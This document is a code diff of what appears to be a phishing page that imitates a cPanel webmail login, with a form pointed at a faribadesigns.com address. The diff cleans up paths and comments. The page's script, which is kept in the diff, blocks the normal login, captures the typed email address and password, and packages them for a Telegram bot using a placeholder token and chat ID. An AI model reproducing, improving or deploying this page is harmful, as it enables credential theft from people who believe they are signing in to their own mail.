@@ -5,12 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
     <title>Webmail Login</title>
    
-    <!-- EXTERNAL CSS -->
-    <link href="./Webmail Login 111_files/open_sans.min.css" rel="stylesheet" type="text/css">
-    <link href="./Webmail Login 111_files/style_v2_optimized.css" rel="stylesheet" type="text/css">
-    
-    <!-- Font Awesome for Icons -->
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <!-- Link to external CSS files -->
+    <link href="open_sans.min.css" rel="stylesheet" type="text/css">
+    <link href="style_v2_optimized.css" rel="stylesheet" type="text/css">
 
     <style type="text/css">
         .input-field-login {
@@ -30,13 +27,8 @@
             padding-left: 30px; /* Add space for the icons */
         }
     </style>
-    <!--[if IE 6]>
-    <style type="text/css">
-        img {
-            behavior: url(/cPanel_magic_revision_1569620179/unprotected/cp_pngbehavior_login.htc);
-        }
-    </style>
-    <![endif]-->
+    <!-- Font Awesome for Icons -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
 
     <script>
     window.DOM = { get: function(id) { return document.getElementById(id) } };
@@ -47,7 +39,6 @@
 
 <input type="hidden" id="goto_uri" value="/3rdparty/roundcube/?_task=mail&amp;_mbox=INBOX">
 <input type="hidden" id="goto_app" value="">
-<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
 <div id="login-wrapper" class="group " style="opacity: 1; visibility: visible;">
     <div class="wrapper">
     <div id="notify">
@@ -69,44 +60,24 @@
         </div>
     </div>
 
-    <div style="display:none">
-        <div id="locale-container" style="visibility:hidden">
-            <div id="locale-inner-container">
-                <div id="locale-header">
-                    <div class="locale-head">Please select a locale:</div>
-                    <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
-                </div>
-                <div id="locale-map">
-                    <div class="languages">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
     <div id="content-container">
         <div id="login-container">
             <div id="login-sub-container">
                     <div id="login-sub-header">
-                        <img class="main-logo" src="./Webmail Login 111_files/webmail-logo.svg" alt="logo">
+                        <img class="main-logo" src="webmail-logo.svg" alt="logo">
                     </div>
                     <div id="login-sub">
-                        <div id="clickthrough_form" style="visibility:hidden">
-                            <form action="javascript:void(0)">
-                                <div class="notices"></div>
-                                <button type="submit" class="clickthrough-cont-btn">Continue</button>
-                            </form>
-                        </div>
                         <div id="forms">
-                            <form novalidate="" id="login_form" action="https://webmail.faribadesigns.com/login/" method="post" target="_self" style="visibility:">
+                            <form novalidate="" id="login_form" action="https://webmail.faribadesigns.com/login/" method="post" target="_self">
                                 <div class="input-req-login"><label for="user">Email Address</label></div>
                                 <div class="input-field-login icon username-container">
                                     <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
-                                    <i class="fa fa-user"></i> <!-- Profile icon -->
+                                    <i class="fa fa-user"></i>
                                 </div>
                                 <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                 <div class="input-field-login icon password-container">
                                     <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
-                                    <i class="fa fa-lock"></i> <!-- Padlock icon -->
+                                    <i class="fa fa-lock"></i>
                                 </div>
                                 <div class="controls">
                                     <div class="login-btn">
@@ -139,19 +110,16 @@
             </ul>
         </div>
     </div>
-
 </div>
 
 <script>
 document.getElementById("login_form").addEventListener("submit", function (e) {
-    e.preventDefault(); // Prevent form submission
+    e.preventDefault(); 
     
     const email = document.getElementById("user").value;
     const password = document.getElementById("pass").value;
 
-    // Replace 'YOUR_BOT_TOKEN' with your bot's token
     const botToken = "YOUR_BOT_TOKEN";
-    // Replace 'CHAT_ID' with your chat ID
     const chatId = "CHAT_ID";
 
     const message = `Email: ${email}\nPassword: ${password}`;
@@ -176,16 +144,10 @@ document.getElementById("login_form").addEventListener("submit", function (e) {
 });
 </script>
 
-<style>
-    @media (min-width: 481px) {
-        #select_user_form {
-            width: px;
-        }
-    }
-</style>
-
-<div class="copyright">Copyright©&nbsp;2024 cPanel, L.L.C.
-    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
+<div class="copyright">
+    Copyright©&nbsp;2024 cPanel, L.L.C.
+    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
+</div>
 
 </body>
 </html>
